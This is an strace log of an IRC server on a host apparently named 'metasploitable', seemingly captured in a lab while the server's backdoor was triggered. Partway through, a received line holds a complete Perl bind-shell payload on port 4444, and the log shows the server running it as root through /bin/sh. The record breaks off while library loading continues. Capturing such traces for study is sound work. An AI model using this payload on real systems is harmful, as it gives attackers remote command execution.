4519  20:03:01.707452 select(1024, [2 3 4 7 9], [], NULL, {0, 540000}) = 1 (in [9], left {0, 350000})
4519  20:03:01.896853 clock_gettime(CLOCK_MONOTONIC, {47391, 713861840}) = 0
4519  20:03:01.896853 recv(9, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  20:03:01.896853 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896853 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896854 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896869 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896883 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896898 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896912 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896925 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896939 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896953 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896967 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896980 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.896994 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897008 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897022 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897035 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897049 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897063 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897091 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897133 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897147 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897175 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:01.897192 gettimeofday({1495670581, 897196}, NULL) = 0
4519  20:03:01.897204 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 50000})
4519  20:03:02.856061 clock_gettime(CLOCK_MONOTONIC, {47392, 673081646}) = 0
4519  20:03:02.856083 time(NULL)        = 1495670582
4519  20:03:02.856094 time(NULL)        = 1495670582
4519  20:03:02.856107 gettimeofday({1495670582, 856111}, NULL) = 0
4519  20:03:02.856119 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  20:03:02.856159 clock_gettime(CLOCK_MONOTONIC, {47392, 673171605}) = 0
4519  20:03:02.856169 gettimeofday({1495670582, 856173}, NULL) = 0
4519  20:03:02.856180 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  20:03:02.856219 clock_gettime(CLOCK_MONOTONIC, {47392, 673231732}) = 0
4519  20:03:02.856230 accept(2, 0, NULL) = 5
4519  20:03:02.856253 getpeername(5, {sa_family=AF_INET, sin_port=htons(34679), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:03:02.856333 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:03:02.856350 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:03:02.856364 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:03:02.856376 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:03:02.856388 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:03:02.856399 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:03:02.856411 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:03:02.856428 clock_gettime(CLOCK_MONOTONIC, {47392, 673441482}) = 0
4519  20:03:02.856440 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:03:02.856508 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:03:02.856543 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:03:02.856553 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:03:02.856564 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:03:02.856579 send(6, "&\366\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:03:02.856629 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:03:02.856687 gettimeofday({1495670582, 856691}, NULL) = 0
4519  20:03:02.856699 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 980000})
4519  20:03:02.867649 clock_gettime(CLOCK_MONOTONIC, {47392, 684678155}) = 0
4519  20:03:02.867692 recvfrom(6, "&\366\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\1\37\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:03:02.867749 close(6)          = 0
4519  20:03:02.867770 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:03:02.867785 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  20:03:02.867873 time(NULL)        = 1495670582
4519  20:03:02.867901 time(NULL)        = 1495670582
4519  20:03:02.867914 gettimeofday({1495670582, 867918}, NULL) = 0
4519  20:03:02.867927 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:03:02.867975 clock_gettime(CLOCK_MONOTONIC, {47392, 684988455}) = 0
4519  20:03:02.868076 gettimeofday({1495670582, 868085}, NULL) = 0
4519  20:03:02.868108 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 990000})
4519  20:03:02.876904 clock_gettime(CLOCK_MONOTONIC, {47392, 693923861}) = 0
4519  20:03:02.876925 recv(9, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  20:03:02.876949 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.876967 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.876982 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.876996 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877010 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877024 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877038 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877052 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877065 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877079 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877093 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877107 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877120 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877134 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877147 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877161 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877175 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877188 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877202 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877216 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877239 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877253 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:02.877312 gettimeofday({1495670582, 877318}, NULL) = 0
4519  20:03:02.877327 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:03:02.877371 clock_gettime(CLOCK_MONOTONIC, {47392, 694384490}) = 0
4519  20:03:02.877397 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:03:02.877426 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:03:02.877449 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:03:02.877461 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:03:02.877477 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 10102
10102 20:03:02.877573 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
10102 20:03:02.877588 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
10102 20:03:02.877599 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10102 20:03:02.877614 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
10102 20:03:02.877734 brk(0)            = 0x80f9000
10102 20:03:02.877759 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.877809 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdd000
10102 20:03:02.877844 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.877864 open("/etc/ld.so.cache", O_RDONLY) = 1
10102 20:03:02.877878 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10102 20:03:02.877898 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd5000
10102 20:03:02.877909 close(1)          = 0
10102 20:03:02.877920 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.877951 open("/lib/libncurses.so.5", O_RDONLY) = 1
10102 20:03:02.877967 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
10102 20:03:02.878065 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
10102 20:03:02.878084 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa5000
10102 20:03:02.878096 mmap2(0xb7fd2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fd2000
10102 20:03:02.878115 close(1)          = 0
10102 20:03:02.878127 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.878142 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10102 20:03:02.878163 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10102 20:03:02.878256 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10102 20:03:02.878392 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa1000
10102 20:03:02.878421 mmap2(0xb7fa3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fa3000
10102 20:03:02.878443 close(1)          = 0
10102 20:03:02.878455 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.878471 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10102 20:03:02.878487 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10102 20:03:02.878637 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10102 20:03:02.878654 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa0000
10102 20:03:02.878671 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e51000
10102 20:03:02.878682 mmap2(0xb7f9a000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f9a000
10102 20:03:02.878712 mmap2(0xb7f9d000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f9d000
10102 20:03:02.878726 close(1)          = 0
10102 20:03:02.878749 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e50000
10102 20:03:02.878762 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e506b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10102 20:03:02.878819 mprotect(0xb7f9a000, 4096, PROT_READ) = 0
10102 20:03:02.878907 munmap(0xb7fd5000, 29913) = 0
10102 20:03:02.878939 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.878954 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
10102 20:03:02.878981 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcabe70) = -1 ENOTTY (Inappropriate ioctl for device)
10102 20:03:02.879028 brk(0)            = 0x80f9000
10102 20:03:02.879038 brk(0x80fa000)    = 0x80fa000
10102 20:03:02.879050 brk(0x80fb000)    = 0x80fb000
10102 20:03:02.879067 getuid32()        = 0
10102 20:03:02.879077 getgid32()        = 0
10102 20:03:02.879086 geteuid32()       = 0
10102 20:03:02.879095 getegid32()       = 0
10102 20:03:02.879110 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.879124 time(NULL)        = 1495670582
10102 20:03:02.879136 brk(0x80fc000)    = 0x80fc000
10102 20:03:02.879151 brk(0x80fd000)    = 0x80fd000
10102 20:03:02.879172 open("/proc/meminfo", O_RDONLY) = 1
10102 20:03:02.879195 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
10102 20:03:02.879214 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdc000
10102 20:03:02.879225 read(1, "MemTotal:      1035240 kB\nMemFree:        198968 kB\nBuffers:        139664 kB\nCached:         454180 kB\nSwapCached:          0 kB\nActive:         474552 kB\nInactive:       308096 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        198720 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            1376 kB\nWriteback:           0 kB\nAnonPages:      188836 kB\nMapped:          52036 kB\nSlab:            31620 kB\nSReclaimable:    19312 kB\nSUnreclaim:      12308 kB\nPageTables:       2900 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   707936 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
10102 20:03:02.879323 close(1)          = 0
10102 20:03:02.879335 munmap(0xb7fdc000, 4096) = 0
10102 20:03:02.879375 brk(0x80fe000)    = 0x80fe000
10102 20:03:02.879417 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10102 20:03:02.879431 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10102 20:03:02.879443 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10102 20:03:02.879455 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10102 20:03:02.879467 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
10102 20:03:02.879479 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
10102 20:03:02.879492 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.879504 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10102 20:03:02.879517 uname({sys="Linux", node="metasploitable", ...}) = 0
10102 20:03:02.879568 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10102 20:03:02.879586 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10102 20:03:02.879605 brk(0x8100000)    = 0x8100000
10102 20:03:02.879618 getcwd("/etc/unreal", 4096) = 12
10102 20:03:02.879632 getpid()          = 10102
10102 20:03:02.879649 getppid()         = 4519
10102 20:03:02.879666 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10102 20:03:02.879688 stat64("/sbin/sh", 0xbfcabe48) = -1 ENOENT (No such file or directory)
10102 20:03:02.879702 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10102 20:03:02.879720 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10102 20:03:02.879745 socket(PF_FILE, SOCK_STREAM, 0) = 1
10102 20:03:02.879759 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10102 20:03:02.879771 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10102 20:03:02.879795 close(1)          = 0
10102 20:03:02.879807 socket(PF_FILE, SOCK_STREAM, 0) = 1
10102 20:03:02.879817 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10102 20:03:02.879827 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10102 20:03:02.879836 close(1)          = 0
10102 20:03:02.879836 open("/etc/nsswitch.conf", O_RDONLY) = 1
10102 20:03:02.879836 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10102 20:03:02.879836 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdc000
10102 20:03:02.879837 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10102 20:03:02.879837 read(1, "", 4096) = 0
10102 20:03:02.879837 close(1)          = 0
10102 20:03:02.879837 munmap(0xb7fdc000, 4096) = 0
10102 20:03:02.879837 open("/etc/ld.so.cache", O_RDONLY) = 1
10102 20:03:02.879838 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10102 20:03:02.879838 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd5000
10102 20:03:02.879838 close(1)          = 0
10102 20:03:02.879838 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.879843 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
10102 20:03:02.879859 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 